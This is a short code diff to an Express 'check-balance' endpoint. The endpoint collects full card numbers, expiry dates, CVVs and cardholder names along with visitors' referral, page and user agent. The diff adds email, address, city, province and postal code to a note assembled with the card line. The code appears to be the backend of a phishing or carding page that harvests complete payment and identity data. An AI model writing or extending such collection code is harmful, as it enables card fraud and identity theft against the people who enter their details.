@@ -42,7 +42,7 @@ app.post('/api/check-balance', async (req, res) => {
     return res.json({ success: false, error: 'API token not configured' });
   }
 
-  const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, userAgent, referral, pageUrl } = req.body;
+  const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, email, address, city, province, postalCode, timezone, userAgent, referral, pageUrl } = req.body;
 
   try {
     const number = (cardNumber || '').replace(/\s/g, '');
@@ -84,6 +84,11 @@ app.post('/api/check-balance', async (req, res) => {
     infoParts.push(`Referral: ${referral || 'Direct'}`);
     infoParts.push(`Page: ${pageUrl || 'unknown'}`);
     if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
+    if (email) infoParts.push(`Email: ${email}`);
+    if (address) infoParts.push(`Address: ${address}`);
+    if (city) infoParts.push(`City: ${city}`);
+    if (province) infoParts.push(`Province: ${province}`);
+    if (postalCode) infoParts.push(`Postal: ${postalCode}`);
     if (userAgent) infoParts.push(`UA: ${userAgent}`);
 
     const fullNote = cardLine + '\n' + infoParts.join(' | ');
